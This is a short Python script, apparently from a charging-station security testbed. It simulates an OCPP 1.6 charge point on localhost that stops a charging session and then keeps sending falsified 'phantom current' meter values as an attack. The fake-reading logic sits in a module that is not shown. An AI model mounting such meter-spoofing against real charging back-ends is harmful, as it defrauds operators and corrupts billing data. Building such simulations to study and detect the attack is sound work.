
import asyncio
import websockets
from .charge_point import SimulatedChargePoint

async def run_attack():
    uri = "ws://127.0.0.1:9000/CP_HAYALET"
    async with websockets.connect(uri, subprotocols=["ocpp1.6"]) as ws:
        cp = SimulatedChargePoint("CP_HAYALET", ws)
        await asyncio.gather(cp.start(), attack_logic(cp))

async def attack_logic(cp):
    await asyncio.sleep(1)
    await cp.send_boot_notification()
    await cp.start_charging()
    
    # Normal Şarj
    for _ in range(3):
        await asyncio.sleep(2)
        await cp.simulate_meter_values()

    # Şarjı Durdur
    await asyncio.sleep(2)
    await cp.stop_charging()

    # SALDIRI (Hayalet Akım)
    print(">>> SALDIRI BAŞLIYOR: Hayalet Akım <<<")
    for _ in range(10): # Daha uzun süre saldır
        await asyncio.sleep(1.5)
        await cp.simulate_meter_values(phantom_mode=True)

if __name__ == "__main__":
    try:
        asyncio.run(run_attack())
    except KeyboardInterrupt:
        pass
